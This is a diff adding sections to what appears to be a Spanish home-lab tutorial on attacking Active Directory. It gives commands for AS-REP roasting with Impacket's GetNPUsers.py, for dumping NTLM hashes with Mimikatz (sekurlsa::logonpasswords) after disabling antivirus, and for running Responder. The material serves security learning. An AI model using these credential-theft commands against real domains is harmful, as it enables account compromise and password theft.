@@ -28,6 +28,47 @@ En ```Opciones de cuenta``` bajamos hasta ver:
 
 Seleccionamos la última opción, llamada ```No pedir la autentificación Kerberos previa```
 
-Ya tenemos todo listo para ejecutar impacket y ver los tickets TGT(Ticket Granting Ticket).
+Ya tenemos todo listo para hacer diferentes ataques a un AD.
 
-# Obteniendo impacket
+# Obteniendo y atacando con Impacket
+
+En una máquina virual Linux, haremos un ```sudo git clone https://github.com/SecureAuthCorp/impacket.git``` en ```/opt```
+
+Nos dirigimos a la carpeta ```examples``` y ahí tendremos el primer programa ```GetNPUsers.py```
+
+Este programa nos servirá para ver si en el dominio hay algún usuario sin autorización de kerberos previa, tal y cómo hemos creado antes.
+
+```sudo python3 GetNPUsers.py -dc-ip SERVER_IP -usersfile USERS_FILE -no-pass DOMAIN_NAME/```
+
+Con este comando, tendréis que poner la ip del servidor AD, una lista con los nombres de usuario, y el nombre del dominio.
+
+![a5298cc5e39f8cdc2e287e3da168f796](https://user-images.githubusercontent.com/107114264/174579092-9b5250ee-4c0c-47b2-a086-9e02d1d99d82.png)
+
+El ticket que nos da es un TGT(Ticket Granting Ticket), este ticket se puede desencriptar de muchas maneras, una de ellas es hashcat.
+
+# Obteniendo y atacando con Mimikatz
+
+Antes de descargarlo, desactivar vuestro antivirus para que no os borre ningún fichero.
+
+Descargamos en una máquina windows del servidor de AD, mimikatz desde ```https://github.com/ParrotSec/mimikatz```
+
+En mi caso ejecutaré el de 64 bits en ```x64``` 
+
+!!!!Debéis ejecutarlo como administrador¡¡¡¡
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+Ejecutando esos dos comandos en ese orden debería sacar NTLMs de todos los usuarios del AD.
+
+![62ff019ce7327c7de20e15ba16c11fd2](https://user-images.githubusercontent.com/107114264/174583072-776fc303-36b0-408e-823b-e40ba49ecb5b.png)
+
+Con esto podéis desencriptarlo y obtener las claves de acceso.
+
+# Obteniendo y atacando con Responder
+
+Lo descargaremos en una linux en ```/opt``` con ```sudo git clone https://github.com/SpiderLabs/Responder.git```
+
+Ejecutaremos nuestro responder ```sudo python2.7 Responder.py -I eth0```
